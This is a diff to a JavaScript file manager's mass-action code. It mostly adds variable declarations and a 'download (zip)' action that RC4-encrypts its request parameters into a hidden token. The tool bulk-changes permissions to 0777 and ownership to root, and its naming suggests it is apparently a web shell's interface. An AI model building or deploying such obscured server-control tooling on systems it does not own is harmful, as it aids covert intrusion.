@@ -433,8 +433,9 @@ function edit_save(editType){
 
 
 function mass_act(type){
-	buffer = get_all_cbox_selected('xplTable', 'xpl_href');
+	var buffer = get_all_cbox_selected('xplTable', 'xpl_href');
 
+	var arcType, title;
 	if((type=='cut')||(type=='copy')){
 		localStorage.setItem('bufferLength', buffer.length);
 		localStorage.setItem('bufferAction', type);
@@ -443,12 +444,13 @@ function mass_act(type){
 		});
 	}
 	else if(type=='paste'){
-		bufferLength = localStorage.getItem('bufferLength');
-		bufferAction = localStorage.getItem('bufferAction');
+		var bufferLength = localStorage.getItem('bufferLength');
+		var bufferAction = localStorage.getItem('bufferAction');
 		if(bufferLength>0){
-			massBuffer = '';
+			var massBuffer = '';
 			for(var i=0;i<bufferLength;i++){
-				if((buff = localStorage.getItem('buffer_'+i))){
+				var buff = localStorage.getItem('buffer_'+i);
+				if(buff){
 					massBuffer += buff + '\n';
 				}
 			}
@@ -457,7 +459,7 @@ function mass_act(type){
 			if(bufferAction=='cut') title = 'move';
 			else if(bufferAction=='copy') title = 'copy';
 
-			content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
+			var content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>"+title+" here</td><td><input type='text' value='"+html_safe(get_cwd())+"' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">"+title+"</span></td></tr></table>";
 			show_box(ucfirst(title), content);
 		}
 
@@ -480,8 +482,9 @@ function mass_act(type){
 		}
 	}
 	else if((type=='compress (tar)')||(type=='compress (tar.gz)')||(type=='compress (zip)')){
-		date = new Date();
-		rand = date.getTime();
+		var date = new Date();
+		var rand = date.getTime();
+		var arcFilename;
 		if(type=='compress (tar)'){
 			arcType = 'tar';
 			arcFilename = rand+'.tar';
@@ -507,6 +510,22 @@ function mass_act(type){
 			show_box(ucfirst(title), content);
 		}
 	}
+    else if(type==='download (zip)'){
+        arcType = 'download';
+        arcFilename = new Date().getTime()+'.zip';
+
+        if(buffer.length>0){
+            massBuffer = '';
+            $.each(buffer,function(i,v){
+                massBuffer += v + '\n';
+            });
+            massBuffer = $.trim(massBuffer);
+            title = type;
+
+            content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>"+massBuffer+"</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='"+arcFilename+"' onkeydown=\"trap_enter(event, 'mass_act_go_"+arcType+"');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('"+arcType+"');\">download</span></td></tr></table>";
+            show_box(ucfirst(title), content);
+        }
+    }
 	else if(type!=''){
 		if(buffer.length>0){
 			massBuffer = '';
@@ -515,7 +534,7 @@ function mass_act(type){
 			});
 			massBuffer = $.trim(massBuffer);
 			title = type;
-			line = '';
+			var line = '';
 			if(type=='chmod') line = "<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
 			else if(type=='chown') line = "<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_"+type+"');\"></td></tr>";
 			else if(type=='touch'){
@@ -573,12 +592,12 @@ function mass_act_go_touch(){
 }
 
 function mass_act_go(massType){
-	massBuffer = $.trim($('.massBuffer').val());
-	massPath = get_cwd();
-	massValue = '';
+	var massBuffer = $.trim($('.massBuffer').val());
+    var massPath = get_cwd();
+    var massValue = '';
 	if(massType=='paste'){
-		bufferLength = localStorage.getItem('bufferLength');
-		bufferAction = localStorage.getItem('bufferAction');
+        var bufferLength = localStorage.getItem('bufferLength');
+        var bufferAction = localStorage.getItem('bufferAction');
 		if(bufferLength>0){
 			massBuffer = '';
 			for(var i=0;i<bufferLength;i++){
@@ -597,24 +616,37 @@ function mass_act_go(massType){
 	else if((massType=='tar')||(massType=='targz')||(massType=='zip')){
 		massValue = $('.massValue').val();
 	}
-	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')){
+	else if((massType=='untar')||(massType=='untargz')||(massType=='unzip')||(massType=='download')){
 		massValue = $('.massValue').val();
 	}
 
+	if(massBuffer === '') {
+		return;
+    }
 
-	if(massBuffer!=''){
-		send_post({massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue }, function(res){
-			if(res!='error'){
-				$('.boxresult').html(res+' Operation(s) succeeded');
-			}
-			else $('.boxresult').html('Operation(s) failed');
-			navigate(get_cwd());
-		});
+    var args = {massType:massType,massBuffer:massBuffer,massPath:massPath,massValue:massValue};
+    if(massType === 'download') {
+        var params = $.param(args);
+        var dz_token = bin2hex(rc4(window['cipher_key'], params));
+
+        var form = $('#form');
+        form.append("<input type='hidden' name='dz_token' value='"+dz_token+"'>");
+        form.submit();
+        form.html('');
+        hide_box();
+	} else {
+        send_post(args, function(res){
+            if(res!='error'){
+                $('.boxresult').html(res+' Operation(s) succeeded');
+            }
+            else $('.boxresult').html('Operation(s) failed');
+            navigate(get_cwd());
+        });
 	}
 }
 
 function xpl_update_status(){
-	totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
+	var totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
 	if(totalSelected==0) $('.xplSelected').html('');
 	else $('.xplSelected').html(', '+totalSelected+' item(s) selected');
 }
